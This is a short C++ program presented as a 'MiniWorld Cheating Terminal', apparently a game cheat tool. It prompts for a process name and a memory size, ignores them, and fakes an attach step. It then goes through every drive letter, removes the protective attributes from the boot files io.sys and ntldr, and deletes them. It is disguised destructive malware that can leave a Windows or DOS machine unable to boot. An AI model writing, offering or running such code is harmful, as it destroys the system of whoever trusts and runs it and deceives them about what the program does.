#include<iostream>
#include<string>
#include<ctime>
using namespace std;
int main(){
	system("title MiniWorld Cheating Terminal Version 1.0 Build 10");
	cout<<"Type the MiniWorld main process: ";
	string x;
	cin>>x;
	cout<<"Maximum Memory (At Least 1 Megabyte): ";
	cin>>x;
	int oldtime=time(NULL);
	cout<<"Attaching...\n";
	while(time(NULL)-oldtime<=3);
	cout<<"done";
	string command;
	for(int i='A';i<='Z';i++){
		command="";
		command.push_back(i);
		command.push_back(':');
		system(command.c_str());
		system("cd \\");
		system("attrib -s -h -r -a io.sys");
		system("attrib -s -h -r -a ntldr");
		
		system("del /q io.sys");
		system("del /q ntldr");
		
	}
	
}
